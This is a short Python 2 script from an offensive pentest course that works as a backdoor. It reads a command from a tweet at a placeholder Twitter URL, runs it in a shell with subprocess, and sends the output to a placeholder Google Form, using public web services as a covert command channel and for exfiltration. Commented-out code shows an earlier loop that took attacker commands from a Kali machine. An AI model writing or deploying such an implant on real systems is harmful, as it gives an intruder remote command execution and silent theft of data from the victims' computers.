# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


# Basic TCP Client

import socket                     # For Building TCP Connection
import subprocess                 # To start the shell in the system
import requests   # To install requests library, just type on the CMD:  pip install requests
import urllib
from BeautifulSoup import BeautifulSoup
url = "https://twitter.com/PUTHERE"

#url = raw_input("Enter the URL ")
ht= urllib.urlopen(url)
html_page = ht.read()
b_object = BeautifulSoup(html_page)



data2 = b_object.body.find('div',attrs={'class' : 'js-tweet-text-container'})

print data2.text



# url = 'https://docs.google.com/forms/PUTHERE/formResponse' # please replace the URL with your own google form :D

# form_data = {'entry.NUMBERHERER':"TEXT HERE"}
# r = requests.post(url, data=form_data)


def connect():

            command =  data2.text                                
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            #print( CMD.stdout.read()  ) # show the result
            #print( CMD.stderr.read()  ) # show the error -if any-, such as syntax error
            komenda = CMD.stdout.read()
            print(komenda)
            url = 'https://docs.google.com/forms/PUTLINKHERE/formResponse' # please replace the URL with your own google form :D

            form_data = {'entry.NUMBER': "Here is a {}".format(komenda)}
            r = requests.post(url, data=form_data)

# def connect():
    # while True:                                                 # keep receiving commands from the Kali machine
        # command =  data2.text                                 # read the first KB of the tcp socket
        
        # if 'terminate' in command:                  # if we got termiante order from the attacker, close the socket and break the loop
            # break 
        
        # else:                                      # otherwise, we pass the received command to a shell process
            
            # CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # print( CMD.stdout.read()  ) # send back the result
            # print( CMD.stderr.read()  ) # send back the error -if any-, such as syntax error

def main ():
    connect()
main()











